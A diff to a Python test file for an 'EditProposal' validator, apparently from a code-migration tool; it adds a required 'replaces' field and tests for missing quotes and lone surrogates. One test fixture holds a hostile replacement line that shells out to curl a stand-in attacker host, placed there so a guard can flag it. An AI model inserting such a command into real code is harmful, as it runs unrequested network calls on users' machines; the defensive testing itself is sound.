@@ -54,6 +54,7 @@ PROPOSAL = EditProposal(
     start_line=4,
     end_line=6,
     symbol="google.generativeai.GenerativeModel",
+    replaces="the old lines",
     replacement="def ask(prompt):\n    return CLIENT.models.generate_content(prompt).text",
     rationale="The seed key has no equivalent, so the config is dropped.",
 )
@@ -256,6 +257,7 @@ def test_a_proposal_holds_a_path_that_climbs_out_of_the_repository() -> None:
         start_line=1,
         end_line=1,
         symbol="not a qualified name at all",
+        replaces="",
         replacement="import os; os.system('curl evil.example')",
         rationale="This is what the guard has to be able to point at.",
     )
@@ -279,6 +281,9 @@ def test_a_proposal_holds_a_path_that_climbs_out_of_the_repository() -> None:
             id="surrogate-new",
         ),
         pytest.param(
+            {"replaces": "x = '\ud83d'"}, "replaces holds a lone surrogate", id="surrogate-old"
+        ),
+        pytest.param(
             {"rationale": "\ud800"}, "rationale holds a lone surrogate", id="surrogate-why"
         ),
     ],
@@ -290,6 +295,7 @@ def test_a_proposal_that_cannot_be_held_is_refused(overrides: dict[str, Any], me
         "start_line": 4,
         "end_line": 6,
         "symbol": "google.generativeai.GenerativeModel",
+        "replaces": "model = genai.GenerativeModel()",
         "replacement": "pass",
         "rationale": "because",
     }
@@ -297,6 +303,21 @@ def test_a_proposal_that_cannot_be_held_is_refused(overrides: dict[str, Any], me
 
     with pytest.raises(ValidationError, match=message):
         EditProposal(**fields)
+
+
+def test_a_proposal_that_does_not_say_what_it_replaces_is_not_held() -> None:
+    """The quote is required: a proposal with none cannot be checked against what was sent."""
+    with pytest.raises(ValidationError, match="replaces"):
+        EditProposal.model_validate(
+            {
+                "path": "app.py",
+                "start_line": 4,
+                "end_line": 6,
+                "symbol": "google.generativeai.GenerativeModel",
+                "replacement": "pass",
+                "rationale": "because",
+            }
+        )
 
 
 @pytest.mark.parametrize("line", [0, -1])
@@ -308,6 +329,7 @@ def test_a_proposal_numbers_its_lines_from_one(line: int) -> None:
             start_line=line,
             end_line=6,
             symbol="google.generativeai.GenerativeModel",
+            replaces="model = genai.GenerativeModel()",
             replacement="pass",
             rationale="because",
         )
